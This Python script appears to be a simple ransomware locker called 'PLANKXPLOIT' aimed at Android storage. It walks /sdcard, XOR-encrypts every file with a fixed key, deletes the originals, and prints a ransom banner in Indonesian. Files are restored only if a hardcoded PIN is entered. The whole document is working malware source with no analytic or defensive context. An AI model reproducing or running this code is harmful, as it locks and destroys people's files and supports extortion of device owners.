import os
import base64

FOLDER = "/sdcard"
PIN = "040607"
KEY = 69  # XOR key

def encrypt_file(path):
    with open(path, 'rb') as f:
        content = f.read()
    encrypted = bytes([b ^ KEY for b in content])
    with open(path + ".planklock", 'wb') as f:
        f.write(encrypted)
    os.remove(path)

def decrypt_file(path):
    with open(path, 'rb') as f:
        content = f.read()
    decrypted = bytes([b ^ KEY for b in content])
    original_name = path.replace(".planklock", "")
    with open(original_name, 'wb') as f:
        f.write(decrypted)
    os.remove(path)

def ransom_mode():
    print("\033[1;31m")
    print("""
██████╗ ██╗      █████╗ ███╗   ██╗██╗  ██╗██╗  ██╗██████╗ ██╗     ██╗████████╗
██╔══██╗██║     ██╔══██╗████╗  ██║██║ ██╔╝██║ ██╔╝██╔══██╗██║     ██║╚══██╔══╝
██████╔╝██║     ███████║██╔██╗ ██║█████╔╝ █████╔╝ ██████╔╝██║     ██║   ██║   
██╔═══╝ ██║     ██╔══██║██║╚██╗██║██╔═██╗ ██╔═██╗ ██╔═══╝ ██║     ██║   ██║   
██║     ███████╗██║  ██║██║ ╚████║██║  ██╗██║  ██╗██║     ███████╗██║   ██║   
╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝   ╚═╝   
        PLANKXPLOIT - YOUR FILES ARE LOCKED!
    """)
    print("\n[!] Semua file anda telah dienkripsi.")
    print("[!] Masukkan PIN untuk membuka file.")

def main():
    ransom_mode()
    for root, dirs, files in os.walk(FOLDER):
        for file in files:
            path = os.path.join(root, file)
            if not file.endswith(".planklock"):
                try:
                    encrypt_file(path)
                    print(f"[+] Encrypted: {path}")
                except:
                    continue

    pin_input = input("\nMasukkan PIN untuk dekripsi: ")
    if pin_input == PIN:
        print("\n[✓] PIN benar. Mendekripsi file...")
        for root, dirs, files in os.walk(FOLDER):
            for file in files:
                if file.endswith(".planklock"):
                    path = os.path.join(root, file)
                    try:
                        decrypt_file(path)
                        print(f"[✓] Decrypted: {path}")
                    except:
                        continue
        print("\n[✓] Semua file berhasil dikembalikan!")
    else:
        print("\n[×] PIN salah! File tetap terenkripsi.")

if __name__ == "__main__":
    main()